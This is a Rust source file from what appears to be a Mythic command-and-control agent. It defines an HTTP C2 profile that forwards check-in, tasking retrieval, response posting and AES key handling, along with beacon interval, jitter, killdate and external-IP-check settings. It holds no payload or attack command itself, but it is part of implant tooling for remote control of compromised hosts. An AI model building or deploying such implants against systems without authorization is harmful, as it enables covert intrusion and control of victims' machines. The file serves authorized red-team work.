use crate::Result;
use mythic::C2Transport;
use serde::{Deserialize, Serialize};

pub mod http;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum C2Profile {
    #[serde(rename = "http")]
    Http(http::HttpProfile),
}

impl C2Profile {
    pub fn callback_interval(&self) -> u64 {
        match self {
            C2Profile::Http(p) => p.callback_interval,
        }
    }

    pub fn callback_jitter(&self) -> u64 {
        match self {
            C2Profile::Http(p) => p.callback_jitter,
        }
    }

    /// Killdate string (YYYY-MM-DD), or None if not set.
    pub fn killdate(&self) -> Option<String> {
        match self {
            C2Profile::Http(p) => {
                if p.killdate.is_empty() {
                    None
                } else {
                    Some(p.killdate.clone())
                }
            }
        }
    }

    /// Whether this profile wants an external IP lookup at check-in.
    pub fn external_ip_check(&self) -> bool {
        match self {
            C2Profile::Http(p) => p.external_ip_check(),
        }
    }
}

impl C2Transport for C2Profile {
    fn get_aes_psk(&self) -> Option<String> {
        match self {
            C2Profile::Http(profile) => profile.get_aes_psk(),
        }
    }

    fn set_aes_psk(&mut self, key: &str) -> Option<String> {
        match self {
            C2Profile::Http(profile) => profile.set_aes_psk(key),
        }
    }

    fn random_iv(&self) -> Result<[u8; 16]> {
        match self {
            C2Profile::Http(profile) => profile.random_iv(),
        }
    }

    fn encrypted_exchange_check(&self) -> bool {
        match self {
            C2Profile::Http(profile) => profile.encrypted_exchange_check(),
        }
    }

    fn checkin(&self, packed: &str) -> Result<String> {
        match self {
            C2Profile::Http(profile) => profile.checkin(packed),
        }
    }
    fn get_tasking(&self, packed: &str) -> Result<String> {
        match self {
            C2Profile::Http(profile) => profile.get_tasking(packed),
        }
    }
    fn post_response(&self, packed: &str) -> Result<String> {
        match self {
            C2Profile::Http(profile) => profile.post_response(packed),
        }
    }
}
